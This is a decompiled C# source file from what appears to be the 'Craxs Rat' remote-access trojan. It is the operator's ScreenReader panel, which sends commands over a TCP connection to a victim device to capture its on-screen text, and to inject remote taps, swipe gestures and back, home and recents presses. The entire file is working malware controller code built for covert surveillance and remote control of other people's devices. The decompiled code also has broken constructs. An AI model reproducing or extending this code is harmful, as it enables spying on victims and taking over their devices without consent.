using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x020000C3 RID: 195
	[DesignerGenerated]
	public partial class ScreenReader : Form
	{
		// Token: 0x06000E60 RID: 3680 RVA: 0x00096FF0 File Offset: 0x000951F0
		public ScreenReader()
		{
			base.Load += this.ScreenReader_Load;
			base.FormClosing += this.ScreenReader_FormClosing;
			this.string_0 = "null";
			this.object_0 = true;
			this.bool_0 = false;
			this.int_0 = 0;
			this.bool_1 = false;
			this.InitializeComponent();
		}

		// Token: 0x17000442 RID: 1090
		// (get) Token: 0x06000E63 RID: 3683 RVA: 0x00006B4C File Offset: 0x00004D4C
		// (set) Token: 0x06000E64 RID: 3684 RVA: 0x00097DE4 File Offset: 0x00095FE4
		internal virtual Panel viewpanel
		{
			[CompilerGenerated]
			get
			{
				return this._viewpanel;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.viewpanel_MouseDown);
				MouseEventHandler value3 = new MouseEventHandler(this.viewpanel_MouseMove);
				MouseEventHandler value4 = new MouseEventHandler(this.viewpanel_MouseUp);
				Panel viewpanel = this._viewpanel;
				if (viewpanel != null)
				{
					viewpanel.MouseDown -= value2;
					viewpanel.MouseMove -= value3;
					viewpanel.MouseUp -= value4;
				}
				this._viewpanel = value;
				viewpanel = this._viewpanel;
				if (viewpanel != null)
				{
					viewpanel.MouseDown += value2;
					viewpanel.MouseMove += value3;
					viewpanel.MouseUp += value4;
				}
			}
		}

		// Token: 0x17000443 RID: 1091
		// (get) Token: 0x06000E65 RID: 3685 RVA: 0x00006B54 File Offset: 0x00004D54
		// (set) Token: 0x06000E66 RID: 3686 RVA: 0x00097E60 File Offset: 0x00096060
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x17000444 RID: 1092
		// (get) Token: 0x06000E67 RID: 3687 RVA: 0x00006B5C File Offset: 0x00004D5C
		// (set) Token: 0x06000E68 RID: 3688 RVA: 0x00097E74 File Offset: 0x00096074
		internal virtual DrakeUIButtonIcon disablebtn
		{
			[CompilerGenerated]
			get
			{
				return this._disablebtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.disablebtn_Click);
				DrakeUIButtonIcon disablebtn = this._disablebtn;
				if (disablebtn != null)
				{
					disablebtn.Click -= value2;
				}
				this._disablebtn = value;
				disablebtn = this._disablebtn;
				if (disablebtn != null)
				{
					disablebtn.Click += value2;
				}
			}
		}

		// Token: 0x17000445 RID: 1093
		// (get) Token: 0x06000E69 RID: 3689 RVA: 0x00006B64 File Offset: 0x00004D64
		// (set) Token: 0x06000E6A RID: 3690 RVA: 0x00097EB8 File Offset: 0x000960B8
		internal virtual DrakeUIButtonIcon enablebtn
		{
			[CompilerGenerated]
			get
			{
				return this._enablebtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.enablebtn_Click);
				DrakeUIButtonIcon enablebtn = this._enablebtn;
				if (enablebtn != null)
				{
					enablebtn.Click -= value2;
				}
				this._enablebtn = value;
				enablebtn = this._enablebtn;
				if (enablebtn != null)
				{
					enablebtn.Click += value2;
				}
			}
		}

		// Token: 0x17000446 RID: 1094
		// (get) Token: 0x06000E6B RID: 3691 RVA: 0x00006B6C File Offset: 0x00004D6C
		// (set) Token: 0x06000E6C RID: 3692 RVA: 0x00097EFC File Offset: 0x000960FC
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon2_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon2 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000447 RID: 1095
		// (get) Token: 0x06000E6D RID: 3693 RVA: 0x00006B74 File Offset: 0x00004D74
		// (set) Token: 0x06000E6E RID: 3694 RVA: 0x00097F40 File Offset: 0x00096140
		internal virtual Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000448 RID: 1096
		// (get) Token: 0x06000E6F RID: 3695 RVA: 0x00006B7C File Offset: 0x00004D7C
		// (set) Token: 0x06000E70 RID: 3696 RVA: 0x00097F84 File Offset: 0x00096184
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x17000449 RID: 1097
		// (get) Token: 0x06000E71 RID: 3697 RVA: 0x00006B84 File Offset: 0x00004D84
		// (set) Token: 0x06000E72 RID: 3698 RVA: 0x00097F98 File Offset: 0x00096198
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700044A RID: 1098
		// (get) Token: 0x06000E73 RID: 3699 RVA: 0x00006B8C File Offset: 0x00004D8C
		// (set) Token: 0x06000E74 RID: 3700 RVA: 0x00097FDC File Offset: 0x000961DC
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon3_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon3 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700044B RID: 1099
		// (get) Token: 0x06000E75 RID: 3701 RVA: 0x00006B94 File Offset: 0x00004D94
		// (set) Token: 0x06000E76 RID: 3702 RVA: 0x00098020 File Offset: 0x00096220
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon4;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon4_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon4 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x06000E77 RID: 3703 RVA: 0x00098064 File Offset: 0x00096264
		private void enablebtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					if (this.screenLoger_0 == null)
					{
						this.screenLoger_0 = new ScreenLoger();
						this.screenLoger_0.Show(this);
					}
				}
				catch (Exception ex)
				{
				}
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"SCRD<*>o",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				this.Timer1.Enabled = true;
				this.enablebtn.Enabled = false;
				this.disablebtn.Enabled = true;
			}
		}

		// Token: 0x06000E78 RID: 3704 RVA: 0x000981E4 File Offset: 0x000963E4
		private void disablebtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"SCRD<*>f",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				this.enablebtn.Enabled = true;
				this.disablebtn.Enabled = false;
			}
		}

		// Token: 0x06000E79 RID: 3705 RVA: 0x00098314 File Offset: 0x00096514
		public void method_1(object[] objects_0)
		{
			ScreenReader.Class17 @class = new ScreenReader.Class17(@class);
			@class.screenReader_0 = this;
			checked
			{
				try
				{
					if (!this.viewpanel.InvokeRequired)
					{
						string text = Conversions.ToString(objects_0[0]);
						if (Operators.CompareString(text, "CLR", false) != 0)
						{
							string[] array = text.Split(new char[]
							{
								'^'
							});
							int num = array.Length - 1;
							for (int i = 0; i <= num; i++)
							{
								ScreenReader.Class16 class2 = new ScreenReader.Class16(class2);
								class2.class17_0 = @class;
								string[] array2 = array[i].Split(new char[]
								{
									':'
								});
								class2.textBox_0 = new TextBox();
								string text2 = array2[0];
								if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
								{
									this.screenLoger_0.Logs.AppendText("> " + text2 + "\r\n");
									class2.strings_0 = array2[1].Split(new char[]
									{
										'~'
									});
									string[] array3 = array2[2].Split(new char[]
									{
										'~'
									});
									string[] array4 = null;
									try
									{
										array4 = array2[3].Split(new char[]
										{
											'~'
										});
										goto IL_379;
									}
									catch (Exception ex)
									{
										array4 = null;
										goto IL_379;
									}
									goto IL_134;
									IL_151:
									int num2;
									int num3;
									class2.textBox_0.Location = new Point((int)Math.Round(unchecked(Conversions.ToDouble(class2.strings_0[0]) * ((double)this.viewpanel.Width / (double)num2))), (int)Math.Round(unchecked(Conversions.ToDouble(class2.strings_0[1]) * ((double)this.viewpanel.Height / (double)num3))));
									try
									{
										foreach (object obj in this.viewpanel.Controls)
										{
											Control control = (Control)obj;
											try
											{
												if (class2.textBox_0.Bounds.IntersectsWith(control.Bounds) && class2.textBox_0.Text.Equals(control.Text, StringComparison.CurrentCultureIgnoreCase))
												{
													this.viewpanel.Controls.Remove(control);
												}
											}
											catch (Exception ex2)
											{
											}
										}
									}
									finally
									{
										IEnumerator enumerator;
										if (enumerator is IDisposable)
										{
											(enumerator as IDisposable).Dispose();
										}
									}
									class2.textBox_0.Text = text2;
									if (array4 == null)
									{
										Size size = TextRenderer.MeasureText(class2.textBox_0.Text, class2.textBox_0.Font);
										class2.textBox_0.Size = new Size(size.Width, 20);
									}
									else
									{
										Size size2 = TextRenderer.MeasureText(class2.textBox_0.Text, class2.textBox_0.Font);
										class2.textBox_0.Size = new Size(size2.Width, Conversions.ToInteger(array4[1]));
									}
									class2.textBox_0.BorderStyle = BorderStyle.None;
									class2.textBox_0.BackColor = Color.Black;
									class2.textBox_0.ForeColor = Color.White;
									class2.textBox_0.ReadOnly = true;
									class2.textBox_0.BorderStyle = BorderStyle.FixedSingle;
									class2.textBox_0.DoubleClick += class2.method_0;
									class2.textBox_0.MouseClick += class2.method_1;
									this.viewpanel.Controls.Add(class2.textBox_0);
									goto IL_36E;
									IL_134:
									this.size_0 = new Size(Conversions.ToInteger(array3[0]), Conversions.ToInteger(array3[1]));
									goto IL_151;
									IL_379:
									num2 = Conversions.ToInteger(array3[0]);
									num3 = Conversions.ToInteger(array3[1]);
									if (!(this.size_0 == default(Size)))
									{
										goto IL_151;
									}
									goto IL_134;
								}
								IL_36E:;
							}
						}
						else
						{
							this.viewpanel.Controls.Clear();
						}
					}
					else
					{
						ScreenReader.GDelegate21 method = new ScreenReader.GDelegate21(this.method_1);
						this.viewpanel.Invoke(method, new object[]
						{
							objects_0
						});
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}

		// Token: 0x06000E7A RID: 3706 RVA: 0x00098780 File Offset: 0x00096980
		private void ScreenReader_Load(object sender, EventArgs e)
		{
			this.Timer1.Enabled = true;
			this.Timer1.Start();
		}

		// Token: 0x06000E7B RID: 3707 RVA: 0x000987A4 File Offset: 0x000969A4
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			try
			{
				this.viewpanel.Controls.Clear();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000E7C RID: 3708 RVA: 0x000987E4 File Offset: 0x000969E4
		private void Timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				if (this.viewpanel.Controls.Count > 0)
				{
					int num = this.viewpanel.Controls.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						try
						{
							if (this.viewpanel.Controls[i].Tag != null && Operators.ConditionalCompareObjectEqual(this.viewpanel.Controls[i].Tag, "E", false))
							{
								this.viewpanel.Controls.Remove(this.viewpanel.Controls[i]);
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000E7D RID: 3709 RVA: 0x000988A8 File Offset: 0x00096AA8
		private void ScreenReader_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"SCRD<*>f",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
			this.Timer1.Stop();
			this.Timer1.Enabled = false;
		}

		// Token: 0x06000E7E RID: 3710 RVA: 0x000989D8 File Offset: 0x00096BD8
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>Bc",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000E7F RID: 3711 RVA: 0x00098B10 File Offset: 0x00096D10
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>Ho",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000E80 RID: 3712 RVA: 0x00098C48 File Offset: 0x00096E48
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>RC",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000E81 RID: 3713 RVA: 0x00098D80 File Offset: 0x00096F80
		private void viewpanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.points_0 = new List<Point>();
				this.points_0.Add(new Point(e.X, e.Y));
				this.bool_1 = false;
				this.int_0 = -1;
			}
			else
			{
				this.bool_1 = true;
			}
		}

		// Token: 0x06000E82 RID: 3714 RVA: 0x00098DDC File Offset: 0x00096FDC
		private void viewpanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.int_0 != 0)
			{
				this.bool_0 = true;
				this.bool_1 = false;
				this.points_0.Add(new Point(e.X, e.Y));
			}
		}

		// Token: 0x06000E83 RID: 3715 RVA: 0x00098E20 File Offset: 0x00097020
		private void viewpanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.int_0 = 0;
			int width = this.viewpanel.Width;
			int height = this.viewpanel.Height;
			checked
			{
				if (this.bool_1)
				{
					string text = "clk:";
					Point point = this.viewpanel.PointToClient(Control.MousePosition);
					Point point2 = new Point((int)Math.Round(unchecked((double)point.X * ((double)width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)height / (double)height))));
					text = text + point2.X.ToString() + ":" + point2.Y.ToString();
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>",
							text,
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				else if (this.bool_0)
				{
					this.bool_0 = false;
					this.points_0.Add(new Point(e.X, e.Y));
					StringBuilder stringBuilder = new StringBuilder();
					try
					{
						foreach (Point point3 in this.points_0)
						{
							stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point3.X * ((double)this.size_0.Width / (double)width))), (int)Math.Round(unchecked((double)point3.Y * ((double)this.size_0.Height / (double)height)))).ToString() + ":");
						}
					}
					finally
					{
						List<Point>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					string[] array2 = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_2 = new object[]
					{
						this.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>",
							stringBuilder.ToString(),
							GClass9.string_0,
							array2[0],
							GClass9.string_0,
							array2[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_2);
				}
			}
		}

		// Token: 0x040007F0 RID: 2032
		public GClass8 gclass8_0;

		// Token: 0x040007F1 RID: 2033
		public string string_0;

		// Token: 0x040007F2 RID: 2034
		public object object_0;

		// Token: 0x040007F3 RID: 2035
		public ScreenLoger screenLoger_0;

		// Token: 0x040007F4 RID: 2036
		private bool bool_0;

		// Token: 0x040007F5 RID: 2037
		private int int_0;

		// Token: 0x040007F6 RID: 2038
		private bool bool_1;

		// Token: 0x040007F7 RID: 2039
		public Size size_0;

		// Token: 0x040007F8 RID: 2040
		private List<Point> points_0;

		// Token: 0x020000C4 RID: 196
		// (Invoke) Token: 0x06000E87 RID: 3719
		public delegate void GDelegate21(object[] objects_0);

		// Token: 0x020000C5 RID: 197
		[CompilerGenerated]
		internal sealed class Class16
		{
			// Token: 0x06000E88 RID: 3720 RVA: 0x000991C4 File Offset: 0x000973C4
			public Class16(ScreenReader.Class16 _class16_0)
			{
				if (_class16_0 != null)
				{
					this.textBox_0 = _class16_0.textBox_0;
					this.strings_0 = _class16_0.strings_0;
				}
			}

			// Token: 0x06000E89 RID: 3721 RVA: 0x000991F4 File Offset: 0x000973F4
			internal void method_0(object sender, EventArgs e)
			{
				try
				{
					Clipboard.SetText(this.textBox_0.Text);
					Alert.ShowSucess("Text Copied.");
					this.textBox_0.Tag = "E";
				}
				catch (Exception ex)
				{
				}
			}

			// Token: 0x06000E8A RID: 3722 RVA: 0x0009924C File Offset: 0x0009744C
			internal void method_1(object sender, MouseEventArgs e)
			{
				try
				{
					string text = "clk:";
					this.class17_0.object_0 = 0;
					this.class17_0.screenReader_0.viewpanel.PointToClient(Control.MousePosition);
					text = text + Convert.ToInt32(Conversions.ToDouble(this.strings_0[0])).ToString() + ":" + Convert.ToInt32(Conversions.ToDouble(this.strings_0[1])).ToString();
					string[] array = this.class17_0.screenReader_0.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.class17_0.screenReader_0.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>",
							text,
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.class17_0.screenReader_0.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.class17_0.screenReader_0.gclass8_0
					};
					this.class17_0.screenReader_0.gclass8_0.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}

			// Token: 0x040007F9 RID: 2041
			public TextBox textBox_0;

			// Token: 0x040007FA RID: 2042
			public string[] strings_0;

			// Token: 0x040007FB RID: 2043
			public ScreenReader.Class17 class17_0;
		}

		// Token: 0x020000C6 RID: 198
		[CompilerGenerated]
		internal sealed class Class17
		{
			// Token: 0x06000E8B RID: 3723 RVA: 0x00099430 File Offset: 0x00097630
			public Class17(ScreenReader.Class17 _class17_0)
			{
				if (_class17_0 != null)
				{
					this.object_0 = _class17_0.object_0;
				}
			}

			// Token: 0x040007FC RID: 2044
			public object object_0;

			// Token: 0x040007FD RID: 2045
			public ScreenReader screenReader_0;
		}
	}
}
